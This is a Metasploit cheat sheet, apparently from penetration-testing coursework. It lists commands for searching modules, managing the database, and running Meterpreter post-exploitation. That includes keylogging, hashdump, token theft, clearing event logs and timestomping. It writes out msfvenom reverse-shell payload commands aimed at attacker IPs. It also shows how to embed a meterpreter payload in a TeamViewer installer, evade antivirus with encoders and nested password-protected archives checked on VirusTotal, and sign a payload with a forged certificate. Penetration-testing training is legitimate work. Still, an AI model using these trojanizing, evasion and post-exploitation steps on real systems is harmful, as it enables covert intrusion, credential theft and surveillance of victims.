## Modules

#### MSF - Search Function Help
```Shell
help search
```

#### MSF - Running a specific search
```Shell
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

#### MSF - Permanent Target Specification
```Shell
setg RHOSTS 10.10.10.40
```

 
## Targets

#### MSF - Show Targets
```Shell
show targets
```


## Payloads

#### MSF - Displaying Payloads
```Shell
show payloads
```

#### MSF - Searching for Specific Payloads
```Shell
grep meterpreter show payloads
```

```Shell
grep meterpreter grep reverse_tcp show payloads
```
Using these after selecting an exploit helps narrow down the options even more

### Payload Types

`generic/custom`
Generic listener, multi-use

`generic/shell_bind_tcp`
Generic listener, multi-use, normal shell, TCP connection binding

`generic/shell_reverse_tcp`
Generic listener, multi-use, normal shell, reverse TCP connection

`windows/x64/exec`
Executes an arbitrary command (Windows x64)

`windows/x64/loadlibrary`
Loads an arbitrary x64 library path

`windows/x64/messagebox`
Spawns a dialog via MessageBox using a customizable title, text & icon

`windows/x64/shell_reverse_tcp`
Normal shell, single payload, reverse TCP connection

`windows/x64/shell/reverse_tcp`
Normal shell, stager + stage, reverse TCP connection

`windows/x64/shell/bind_ipv6_tcp`
Normal shell, stager + stage, IPv6 Bind TCP stager

`windows/x64/meterpreter/$`
Meterpreter payload + varieties above

`windows/x64/powershell/$`
Interactive PowerShell sessions + varieties above

`windows/x64/vncinject/$`
VNC Server (Reflective Injection) + varieties above


## Encoders

#### Generating an msfvenom encoded payload
```Shell
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

#### MSF - Displaying exploit compatible encoders
```Shell
show encoders
```

#### Running a payload through VirusTotal to see if it will be detected by AV
```Shell
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```


## Databases

### Setting up the Database

#### PostgreSQL Status
```Shell
service postgresql status
```

#### Start PostgreSQL
```Shell
systemctl start postgresql
```

#### Initiate a Database
```Shell
msfdb init
```

#### Check msfdb status
```Shell
msfdb status
```

#### Connect to the Initiated Database
```Shell
msfdb run
```

### Using the Database

#### MSF - Create a Workspace
```Shell
workspace -a Target_1
```

#### MSF - Select the Workspace
```Shell
workspace Target_1
```

```Shell
workspace
```

#### MSF - Importing Scan Results (e.g., nmap)
```Shell
db_import Target.xml
```
Assuming the name of the nmap file is `Target.xml`

#### MSF - Display Hosts from Imported Nmap Scan
```Shell
hosts -h
```

#### MSF - Display Service from Imported Nmap Scan
```Shell
services -h
```

#### MSF - Display Stored Credentials
```Shell
creds -h
```
Allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials manually, match existing credentials with port specifications, add descriptions, etc.

#### MSF - Stored Loot
```Shell
loot -h
```

### Using Nmap inside MSFconsole

#### MSF - Nmap
```Shell
db_nmap -sV -sS 10.10.10.8
```

### Data Backup

#### MSF - DB Export
```Shell
db_export -f xml backup.xml
```


## Plugins

#### Display Available Plugins
```Shell
ls /usr/share/metasploit-framework/plugins
```

#### MSF - Load Nessus
```Shell
load nessus
```

```Shell
nessus_help
```

### Installing New Plugins

#### Downloading MSF Plugins
```Shell
git clone https://github.com/darkoperator/Metasploit-Plugins
```

#### Copying Plugin to MSF
```Shell
cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

#### MSF - Load Plugin
```Shell
load pentest
```


## MSFconsole Commands

#### MSF - Dumping Hashes
```Shell
hashdump
```

```Shell
lsa_dump_sam
```

#### MSF - Meterpreter LSA Secrets Dump
```Shell
lsa_dump_secrets
```


## Importing Exploits

#### MSF - Directory Structure
```Shell
/usr/share/metasploit-framework/
```

#### Create `.msf4` directory
```Shell
mkdir .msf4
```
Copy exploit to `.msf4` folder

#### Loading Additional Modules at Runtime
```Shell
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
```

```Shell
msfconsole -m /usr/share/metasploit-framework/modules/
```

#### MSF - Loading Additional Modules
```Shell
loadpath /usr/share/metasploit-framework/modules/
```

or

```Shell
reload_all
use exploit/unix/webapp/nagios3_command_injection
```


## IDS/IPS Evasion

#### Embed a payload into an executable file
```Shell
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

### Archives

Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures

#### Generating a payload
```Shell
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

#### Check against VirusTotal
```Shell
msf-virustotal -k <API key> -f test.js 
```

#### Archiving the Payload
```Shell
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
```

```Shell
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
```

```Shell
rar a ~/test.rar -p ~/test.js
```

#### Removing the .RAR Extension
```Shell
mv test.rar test
```

#### Archiving the Payload Again
```Shell
rar a test2.rar -p test
```

#### Removing the .RAR Extension
```Shell
mv test2.rar test2
```

#### Re-test w/ VirusTotal
```Shell
msf-virustotal -k <API key> -f test2
```


## All Commands from HTB Cheatsheet

`show exploits`
Show all exploits within the Framework.

`show payloads`
Show all payloads within the Framework.

`show auxiliary`
Show all auxiliary modules within the Framework.

`search <name>`
Search for exploits or modules within the Framework.

`info`
Load information about a specific exploit or module.

`use <name>`
Load an exploit or module (example: use windows/smb/psexec).

`use <number>`
Load an exploit by using the index number displayed after the search command.

`LHOST`
Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.

`RHOST`
The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).

`setg <function>`
Set a specific value globally (for example, LHOST or RHOST).

`show options`
Show the options available for a module or exploit.

`show targets`
Show the platforms supported by the exploit.

`set target <number>`
Specify a specific target index if you know the OS and service pack.

`set payload <payload>`
Specify the payload to use.

`set payload <number>`
Specify the payload index number to use after the show payloads command.

`show advanced`
Show advanced options.

`set autorunscript migrate -f`
Automatically migrate to a separate process upon exploit completion.

`check`
Determine whether a target is vulnerable to an attack.

`exploit`
Execute the module or exploit and attack the target.

`exploit -j`
Run the exploit under the context of the job. (This will run the exploit in the background.)

`exploit -z`
Do not interact with the session after successful exploitation.

`exploit -e <encoder>`
Specify the payload encoder to use (example: exploit –e shikata_ga_nai).

`exploit -h`
Display help for the exploit command.

`sessions -l`
List available sessions (used when handling multiple shells).

`sessions -l -v`
List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.

`sessions -s <script>`
Run a specific Meterpreter script on all Meterpreter live sessions.

`sessions -K`
Kill all live sessions.

`sessions -c <cmd>`
Execute a command on all live Meterpreter sessions.

`sessions -u <sessionID>`
Upgrade a normal Win32 shell to a Meterpreter console.

`db_create <name>`
Create a database to use with database-driven attacks (example: db_create autopwn).

`db_connect <name>`
Create and connect to a database for driven attacks (example: db_connect autopwn).

`db_nmap`
Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.)

`db_destroy`
Delete the current database.

`db_destroy <user:password@host:port/database>`
Delete database using advanced options.

---

## Meterpreter Commands

`help`
Open Meterpreter usage help.

`run <scriptname>`
Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.

`sysinfo`
Show the system information on the compromised target.

`ls`
List the files and folders on the target.

`use priv`
Load the privilege extension for extended Meterpreter libraries.

`ps`
Show all running processes and which accounts are associated with each process.

`migrate <proc. id>`
Migrate to the specific process ID (PID is the target process ID gained from the ps command).

`use incognito`
Load incognito functions. (Used for token stealing and impersonation on a target machine.)

`list_tokens -u`
List available tokens on the target by user.

`list_tokens -g`
List available tokens on the target by group.

`impersonate_token <DOMAIN_NAMEUSERNAME>`
Impersonate a token available on the target.

`steal_token <proc. id>`
Steal the tokens available for a given process and impersonate that token.

`drop_token`
Stop impersonating the current token.

`getsystem`
Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.

`shell`
Drop into an interactive shell with all available tokens.

`execute -f <cmd.exe> -i`
Execute cmd.exe and interact with it.

`execute -f <cmd.exe> -i -t`
Execute cmd.exe with all available tokens.

`execute -f <cmd.exe> -i -H -t`
Execute cmd.exe with all available tokens and make it a hidden process.

`rev2self`
Revert back to the original user you used to compromise the target.

`reg <command>`
Interact, create, delete, query, set, and much more in the target’s registry.

`setdesktop <number>`
Switch to a different screen based on who is logged in.

`screenshot`
Take a screenshot of the target’s screen.

`upload <filename>`
Upload a file to the target.

`download <filename>`
Download a file from the target.

`keyscan_start`
Start sniffing keystrokes on the remote target.

`keyscan_dump`
Dump the remote keys captured on the target.

`keyscan_stop`
Stop sniffing keystrokes on the remote target.

`getprivs`
Get as many privileges as possible on the target.

`uictl enable <keyboard/mouse>`
Take control of the keyboard and/or mouse.

`background`
Run your current Meterpreter shell in the background.

`hashdump`
Dump all hashes on the target. use sniffer Load the sniffer module.

`sniffer_interfaces`
List the available interfaces on the target.

`sniffer_dump <interfaceID> pcapname`
Start sniffing on the remote target.

`sniffer_start <interfaceID> packet-buffer`
Start sniffing with a specific range for a packet buffer.

`sniffer_stats <interfaceID>`
Grab statistical information from the interface you are sniffing.

`sniffer_stop <interfaceID>`
Stop the sniffer.

`add_user <username> <password> -h <ip>`
Add a user on the remote target.

`add_group_user <"Domain Admins"> <username> -h <ip>`
Add a username to the Domain Administrators group on the remote target.

`clearev`
Clear the event log on the target machine.

`timestomp`
Change file attributes, such as creation date (antiforensics measure).

`reboot`
Reboot the target machine.

### Creating a signed meterpreter payload with Forgery and Signtool
#### Use Forgery3 to create .crt and .key files
```Shell
python3 forgery3.py password
```
#### Create .pfx with openssl using .key, and .crt files
```Shell
openssl pkcs12 -export -out certificate.pfx -inkey thisisatest.com_CA.key -in thisisatest.com_CA.crt
```
#### Create msfvenom payload
```Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.214 LPORT=443 -f dll > backupscript.dll
```
#### Move it to the share (or some other way of accessing a windows host)
#### Use signtool to sign the payload
```cmd.exe
cd "C:\Program Files (x86)\Microsoft SDKs\ClickOnce\SignTool"
```

```cmd
.\signtool.exe sign /f "C:\share\6-Payloads\certificate.pfx" /p "password" /td SHA256 /fd SHA256 "C:\share\6-Payloads\backupscript.dll"
```
